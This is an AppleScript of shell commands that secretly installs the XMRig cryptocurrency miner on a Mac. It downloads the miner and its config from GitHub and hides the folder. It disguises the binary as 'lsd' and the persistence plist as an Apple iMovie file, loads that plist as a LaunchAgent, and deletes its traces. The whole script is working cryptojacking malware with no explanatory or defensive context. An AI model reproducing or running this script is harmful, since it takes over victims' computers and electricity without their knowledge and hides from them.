do shell script "rm -rf /Users/Shared/Webkit"
do shell script "mkdir /Users/Shared/Webkit"
do shell script "/usr/bin/chflags -R hidden /Users/Shared/Webkit"
do shell script "cd /Users/Shared/Webkit && curl -LOk https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-macos-x64.tar.gz && open /Users/Shared/Webkit/xmrig-6.12.2-macos-x64.tar.gz"

do shell script "cd /Users/Shared/Webkit && sleep 1s && cd xmrig-6.12.2 && sleep 1s && mv xmrig /Users/Shared/Webkit/lsd && sleep 1s && cd /Users/Shared/Webkit/ && curl -LOk https://codeload.github.com/UnixCro/XMRig/zip/refs/heads/main && sleep 1s && mv main main.zip && sleep 1s && unzip main.zip && rm -rf xmrig-6.12.2 xmrig-6.12.2-macos-x64.tar.gz && sleep 1s && mv /Users/Shared/Webkit/XMRig-main/config.json /Users/Shared/Webkit/ && rm -rf main.zip && sleep 1s && mv /Users/Shared/Webkit/XMRig-main/com.apple.imovie.plist /Users/Shared/Webkit/"

do shell script "rm -rf /Library/LaunchAgents/com.apple.imovie.plist && mv /Users/Shared/Webkit/com.apple.imovie.plist ~/Library/LaunchAgents && sleep 1s && launchctl load ~/Library/LaunchAgents/com.apple.imovie.plist && rm -rf /Users/Shared/Webkit/XMRig-main"
